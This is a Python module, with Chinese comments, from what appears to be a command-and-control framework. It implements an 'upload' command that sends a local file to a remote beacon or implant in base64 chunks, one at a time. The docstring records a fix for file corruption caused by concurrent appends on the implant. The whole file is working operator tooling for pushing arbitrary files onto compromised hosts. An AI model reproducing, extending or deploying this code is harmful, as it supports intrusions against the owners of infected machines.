"""upload — 推送本地文件到 beacon（分块串行续传：首块覆盖、后续追加）:

upload <beacon_id> <local_path> <remote_path>

串行化(2026-09-28):本命令只入队第 1 块;该块结果回传后由 upload_parse
结果处理器入队下一块(收回执再发下一块)。此前一次性把全部分块入队,而植入物
对每个任务起独立线程并发执行——同一批里含 ≥2 块时会对同一文件并发 append
而交错写坏(默认帧预算 512K 恰好装不下 2 块,把 max_frame_size 调大即触发)。
"""

import base64
import json
import os

_CHUNK = 180 * 1024  # 原始字节/块（base64 后 ~240KB，帧内）；与 upload_parse 保持一致


def run(disp, args):
    if len(args) < 3:
        return "[!] usage: upload <beacon_id> <local_path> <remote_path>"
    bid, local, remote = args[0], args[1], args[2]
    try:
        size = os.path.getsize(local)
    except OSError as e:
        return f"[!] {e}"
    if size <= 0:
        return "[!] 空文件，未下发"
    total = (size + _CHUNK - 1) // _CHUNK
    try:
        with open(local, "rb") as f:
            first = f.read(_CHUNK)
    except OSError as e:
        return f"[!] {e}"

    try:
        task = disp.build_task("upload",
                               [remote, base64.b64encode(first).decode("ascii"), "0"])
    except ValueError as e:
        return f"[!] {e}"
    if task is None:
        return "[!] unknown module: upload"
    # 多块:登记续传(处理器在每块结果回来后再发下一块,保证串行)
    if total > 1:
        task.result_processor = "upload_parse"
        task.proc_arg = json.dumps(
            {"bid": bid, "local": local, "remote": remote,
             "chunk": 0, "total": total}, ensure_ascii=False)
    msg = disp.push_task(bid, task)
    if not str(msg).startswith("[+]"):
        return f"[!] {str(msg).strip() or '任务入队失败'}"
    if total <= 1:
        return f"[+] 已下发 1/1 块 ({size} 字节) → {bid}:{remote}"
    return (f"[+] 已下发第 1/{total} 块 ({size} 字节), 后续块由 upload_parse "
            f"串行续传 → {bid}:{remote}")
